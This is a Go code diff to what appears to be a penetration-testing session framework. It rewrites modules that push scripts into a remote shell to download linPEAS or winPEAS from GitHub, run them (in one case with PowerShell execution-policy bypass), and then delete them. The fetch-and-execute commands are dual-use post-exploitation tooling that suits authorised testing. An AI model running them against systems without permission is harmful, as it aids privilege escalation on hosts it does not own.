@@ -56,18 +56,47 @@ func (m *ModuleManager) RunModule(name string, s *core.Session) error {
 
 type LinPeasModule struct{}
 func (m *LinPeasModule) Name() string { return "linpeas" }
-func (m *LinPeasModule) Description() string { return "Uploads and executes linpeas.sh from GitHub" }
+func (m *LinPeasModule) Description() string { return "Downloads, executes, and cleans up linpeas.sh with safer fallbacks" }
 func (m *LinPeasModule) Execute(s *core.Session) error {
-	s.Write([]byte("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n"))
-	return nil
+	script := `echo "[*] Running linPEAS..."
+TMP_LINPEAS="${TMPDIR:-/tmp}/linpeas.sh"
+if command -v curl >/dev/null 2>&1; then
+  curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o "$TMP_LINPEAS"
+elif command -v wget >/dev/null 2>&1; then
+  wget -qO "$TMP_LINPEAS" https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+else
+  echo "[-] Neither curl nor wget is available"
+  exit 1
+fi
+chmod +x "$TMP_LINPEAS"
+sh "$TMP_LINPEAS"
+STATUS=$?
+rm -f "$TMP_LINPEAS"
+echo "[*] linPEAS finished with status $STATUS"
+`
+	_, err := s.Write([]byte(script + "\n"))
+	return err
 }
 
 type WinPeasModule struct{}
 func (m *WinPeasModule) Name() string { return "winpeas" }
-func (m *WinPeasModule) Description() string { return "Uploads and executes winpeas.bat from GitHub" }
+func (m *WinPeasModule) Description() string { return "Downloads, executes, and cleans up winPEAS with PowerShell/curl fallbacks" }
 func (m *WinPeasModule) Execute(s *core.Session) error {
-	s.Write([]byte("curl.exe -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o winpeas.bat && winpeas.bat\n"))
-	return nil
+	script := `echo [*] Running winPEAS...
+set TMP_WINPEAS=%TEMP%\winPEAS.bat
+powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -UseBasicParsing 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat' -OutFile $env:TEMP'\winPEAS.bat' } catch { exit 1 }" >nul 2>nul
+if not exist "%TMP_WINPEAS%" curl.exe -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat -o "%TMP_WINPEAS%"
+if not exist "%TMP_WINPEAS%" (
+  echo [-] Failed to download winPEAS
+  exit /b 1
+)
+call "%TMP_WINPEAS%"
+set WINPEAS_STATUS=%ERRORLEVEL%
+del /f /q "%TMP_WINPEAS%" >nul 2>nul
+echo [*] winPEAS finished with status %WINPEAS_STATUS%
+`
+	_, err := s.Write([]byte(script + "\n"))
+	return err
 }
 
 type LseModule struct{}
